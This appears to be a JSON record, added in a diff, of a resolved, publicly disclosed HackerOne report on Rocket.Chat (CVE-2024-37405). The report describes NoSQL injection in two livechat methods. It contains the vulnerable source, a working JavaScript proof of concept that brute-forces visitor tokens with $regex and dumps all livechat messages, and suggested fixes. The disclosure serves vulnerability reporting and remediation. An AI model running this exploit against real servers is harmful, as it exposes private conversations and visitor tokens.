@@ -1,0 +1,138 @@
+{
+  "id": 2580062,
+  "global_id": "Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC8yNTgwMDYy",
+  "url": "https://hackerone.com/reports/2580062",
+  "title": "NoSQL injection leaks visitor token and livechat messages",
+  "state": "Closed",
+  "substate": "resolved",
+  "severity_rating": "medium",
+  "readable_substate": "Resolved",
+  "created_at": "2024-06-27T17:35:30.667Z",
+  "submitted_at": "2024-06-27T17:35:31.411Z",
+  "is_member_of_team?": false,
+  "is_organization_group_member?": false,
+  "is_triager?": false,
+  "reporter": {
+    "disabled": false,
+    "username": "gronke",
+    "url": "/gronke",
+    "profile_picture_urls": {
+      "small": "/assets/avatars/default-14ffa99f59cd01423c64904352cc130ffcb6a802eadfd11777a54485749e60f2.png"
+    },
+    "is_me?": false,
+    "cleared": false,
+    "verified": false,
+    "hackerone_triager": false,
+    "hacker_mediation": false
+  },
+  "team": {
+    "id": 19858,
+    "url": "https://hackerone.com/rocket_chat",
+    "handle": "rocket_chat",
+    "profile_picture_urls": {
+      "small": "https://profile-photos.hackerone-user-content.com/variants/000/019/858/ada6c92a338715afad123af214dd6e22fd8dc6ff_original.png/235acf2ba808c3a51a94888fb977392c26f8fb0ccf77a81a4546c5e4065c06f1",
+      "medium": "https://profile-photos.hackerone-user-content.com/variants/000/019/858/ada6c92a338715afad123af214dd6e22fd8dc6ff_original.png/3f1ab5c6a9b6dadada1e6c8121700b884388bd0a43471fee1897a38ce57d0b2c"
+    },
+    "permissions": [],
+    "submission_state": "paused",
+    "default_currency": "usd",
+    "awards_miles": false,
+    "offers_bounties": false,
+    "state": "public_mode",
+    "only_cleared_hackers": false,
+    "pentest_feature_enabled?": false,
+    "pentest_retesting_ends_at": null,
+    "profile": {
+      "name": "Rocket.Chat",
+      "twitter_handle": "RocketChat",
+      "website": "https://rocket.chat",
+      "about": "Rocket.Chat is a company built on open source values and a love for efficiency. The company is driven by our amazing community of contributors."
+    }
+  },
+  "has_bounty?": false,
+  "can_view_team": true,
+  "can_view_report": true,
+  "is_external_bug": false,
+  "is_published": false,
+  "is_participant": false,
+  "has_collaborators": false,
+  "submitted_by_team_member": false,
+  "submitted_with_assistant": false,
+  "stage": 4,
+  "public": true,
+  "visibility": "full",
+  "cve_ids": [
+    "CVE-2024-37405"
+  ],
+  "singular_disclosure_disabled": false,
+  "disclosed_at": "2024-07-11T21:53:52.143Z",
+  "bug_reporter_agreed_on_going_public_at": "2024-07-11T21:53:51.796Z",
+  "team_member_agreed_on_going_public_at": "2024-07-11T19:22:27.070Z",
+  "comments_closed?": false,
+  "facebook_team?": false,
+  "team_private?": false,
+  "vulnerability_information": "## Summary\n\nLivechat messages can be leaked by combining two NoSQL injections affecting `livechat:loginByToken` (pre-authentication) and `livechat:loadHistory`.\n\n## Description\n\nThe `token` parameter of the `livechat:loginByToken` method is not validated and allows NoSQL injection, for instance [`$regex`](https://www.mongodb.com/docs/manual/reference/operator/query/regex/) to efficiently leak existing livechat visitor token \n\n[apps/meteor/app/livechat/server/methods/loginByToken.ts#L17](https://github.com/RocketChat/Rocket.Chat/blob/dbc79b76164c211eda3cf47b74a6aa94d8831abe/apps/meteor/app/livechat/server/methods/loginByToken.ts#L17)\n\n```javascript\nMeteor.methods<ServerMethods>({\n  async 'livechat:loginByToken'(token) {\n    methodDeprecationLogger.method('livechat:loginByToken', '7.0.0');\n    const visitor = await LivechatVisitors.getVisitorByToken(token, { projection: { _id: 1 } });\n\n    if (!visitor) {\n      return;\n    }\n\n    return {\n      _id: visitor._id,\n    };\n  },\n});\n```\n\nWith a known visitor token, an authenticated adversary can load the message history by guessing a room ID or using another NoSQL injection in this methods `rid` parameter. The method requires a valid visitor token, which is known from the first step.\n\n[apps/meteor/app/livechat/server/methods/loadHistory.ts#L30](https://github.com/RocketChat/Rocket.Chat/blob/dbc79b76164c211eda3cf47b74a6aa94d8831abe/apps/meteor/app/livechat/server/methods/loadHistory.ts#L30)\n\n```javascript\nMeteor.methods<ServerMethods>({\n  async 'livechat:loadHistory'({ token, rid, end, limit = 20, ls }) {\n    methodDeprecationLogger.method('livechat:loadHistory', '7.0.0');\n\n    if (!token || typeof token !== 'string') {\n      return;\n    }\n\n    const visitor = await LivechatVisitors.getVisitorByToken(token, { projection: { _id: 1 } });\n\n    if (!visitor) {\n      throw new Meteor.Error('invalid-visitor', 'Invalid Visitor', {\n        method: 'livechat:loadHistory',\n      });\n    }\n\n    const room = await LivechatRooms.findOneByIdAndVisitorToken(rid, token, { projection: { _id: 1 } });\n    if (!room) {\n      throw new Meteor.Error('invalid-room', 'Invalid Room', { method: 'livechat:loadHistory' });\n    }\n\n    return loadMessageHistory({ userId: visitor._id, rid, end, limit, ls });\n  },\n});\n```\n\n## Releases Affected:\n\n  * https://open.rocket.chat\n  * `develop`\n\n## Steps To Reproduce:\n\n  1. Login to a Rocket.Chat appliance with Livechat enabled (e.g. https://open.rocket.chat)\n  2. Open Web Inspector\n  3. Execute Proof-of-Concept\n\n## Proof of Concept\n\n```javascript\nvar pool = \"0123456789abcdef\";\nvar rate_limit = 4; // requests per second\n\nvar guessVisitorToken = (knownValid, guesses) => {\n  return new Promise((resolve, reject) => {\n    if (!guesses.length) {\n      return reject();\n    }\n    const guess = { \"$regex\": `^${knownValid}[${guesses}]` };\n    console.log(\"Meteor.call\", \"livechat:loginByToken\", guess);\n    Meteor.call(\"livechat:loginByToken\", guess, async (err, data) => {\n      await new Promise((resolve) => setTimeout(() => resolve(), (1000 / rate_limit)));\n      if (err) {\n        console.error(err);\n        return reject(err);\n      }\n      if ((data instanceof Object) && data.hasOwnProperty(\"_id\")) {\n        resolve(guesses)\n      } else {\n        reject();\n      }\n    });\n  });\n};\n\nvar bruteforceVisitorToken = async (knownValid=\"\") => {\n\n  let remainingPool = pool;\n  while (true) {\n    await new Promise((resolve) => setTimeout(() => resolve(), (1000 / rate_limit)));\n    if (remainingPool.length === 0) {\n      throw new Error(\"empty pool\");\n    } else if (remainingPool.length === 1) {\n      await guessVisitorToken(knownValid, remainingPool);\n      knownValid += remainingPool[0];\n      remainingPool = pool;\n      continue;\n    } else {\n      const middle = Math.ceil(remainingPool.length / 2);\n      const left = remainingPool.slice(0, middle);\n      const right = remainingPool.slice(middle);\n      try {\n        await guessVisitorToken(knownValid, left);\n        remainingPool = left;\n        continue;\n      } catch(err) {}\n\n      try {\n        await guessVisitorToken(knownValid, right);\n        remainingPool = right;\n        continue\n      } catch(err) {}\n      return knownValid;\n    }\n  }\n}\n\nconst { messages, token } = await bruteforceVisitorToken(\"\")\n  .then((token) => {\n    console.log(\"Token leaked\", token);\n    return new Promise((resolve, reject) => {\n      Meteor.call(\"livechat:loadHistory\", { token, rid: { \"$regex\": \".*\" } }, (err, messages) => {\n        if (err) {\n          console.log(\"failed to leak messages\");\n          return reject();\n        }\n        resolve({ token, messages })\n      })\n    });\n  })\n  .catch(console.error);\n\nconsole.log({ token, messages });\n```\n\n## Suggested mitigation\n\n  * Validate `token` parameter of`livechat:loginByToken` method to be a String.\n  * Validate `rid` parameter of `livechat:loadHistory` method to be a String.\n\n## Impact\n\nUnauthenticated attackers can leak visitor token on Rocket.Chat appliances with Livechat enabled by using a NoSQL injection in the `token` parameter of the `livechat:loginByToken` method. Combined with another NoSQL injection in the `rid` parameter of the `livechat:loadHistory` method, all Livechat messages can be leaked.",
+  "weakness": {
+    "id": 18,
+    "name": "Information Disclosure"
+  },
+  "original_report_id": null,
+  "original_report_url": null,
+  "attachments": [],
+  "allow_singular_disclosure_at": "2024-08-10T19:22:27.390Z",
+  "allow_singular_disclosure_after": -54422537.50749434,
+  "singular_disclosure_allowed": true,
+  "vote_count": 29,
+  "voters": [
+    "he4am",
+    "ragingg",
+    "zy9ard3",
+    "starlox",
+    "shubham_srt",
+    "jmo740",
+    "iwasday",
+    "h4wl3ry",
+    "amitlt",
+    "brotheralameen",
+    "and 19 more..."
+  ],
+  "severity": {
+    "rating": "medium",
+    "score": 6.5,
+    "author_type": "User",
+    "metrics": {
+      "attack_vector": "network",
+      "attack_complexity": "low",
+      "privileges_required": "low",
+      "user_interaction": "none",
+      "scope": "unchanged",
+      "confidentiality": "high",
+      "integrity": "none",
+      "availability": "none"
+    }
+  },
+  "structured_scope": {
+    "databaseId": 293351,
+    "asset_type": "SOURCE_CODE",
+    "asset_identifier": "https://github.com/RocketChat/Rocket.Chat",
+    "max_severity": "critical"
+  },
+  "abilities": {
+    "assignable_team_members": [],
+    "assignable_team_member_groups": []
+  },
+  "is_exploit_agent_supported?": false,
+  "is_linear_agent_ui_supported?": false,
+  "summaries": [
+    {
+      "category": "team",
+      "can_view?": true,
+      "can_create?": false
+    },
+    {
+      "category": "researcher",
+      "can_view?": true,
+      "can_create?": false
+    }
+  ]
+}
